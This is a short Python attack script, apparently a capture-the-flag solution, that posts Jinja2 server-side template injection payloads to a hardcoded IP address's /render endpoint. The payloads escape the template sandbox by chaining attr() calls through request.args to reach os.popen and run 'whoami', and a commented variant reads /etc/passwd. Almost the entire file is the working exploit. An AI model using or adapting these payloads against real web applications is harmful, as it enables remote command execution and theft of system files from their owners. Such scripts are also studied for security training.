#!/usr/bin/env python
# -*- coding:utf-8 -*-
"""
    Author : Virink <virink@outlook.com>
    Date   : 2019/09/06, 16:46
"""

import requests as req
import string

URL = 'http://152.136.210.218:10025'


def fuck(pl):
    params = {
        'data': pl,
        'cc': '__class__',
        'bb': '__base__',
        'ss': '__subclasses__',
        'gi': '__getitem__',
        'ini': '__init__',
        'gg': '__globals__',
        'aa': 'read'
    }
    res = req.post(URL+'/render', params=params)
    html = res.text
    print(res.url)
    print(html)
    return html


if __name__ == '__main__':
    pl = '{{config|safe}}'
    pl = '{% for c in range(config) %}{{c}}{% endfor %}'
    pl = '{% print (g)|safe %}'
    # <flask.g of 'sandbox'> sandbox.py
    pl = '{% print request|safe %}'

    pl = '{% print ""|attr(request.args.cc)|attr(request.args.bb)|attr(request.args.ss)()|attr(request.args.gi)(1)|attr(request.args.ini)|attr(request.args.gg)|attr(request.args.gi)("o"+"s")|attr("popen")("whoami")|attr(request.args.aa)()|safe %}'
    # |attr(request.args.m)
    # |attr(request.args.v1)()
    # |attr(request.args.i)(100)|attr(request.args.n)|attr(request.args.g)|attr(request.args.i)("o"+"s")
    # |attr("popen")("cat+/etc/passwd")|attr(request.args.m)()
    fuck(pl)
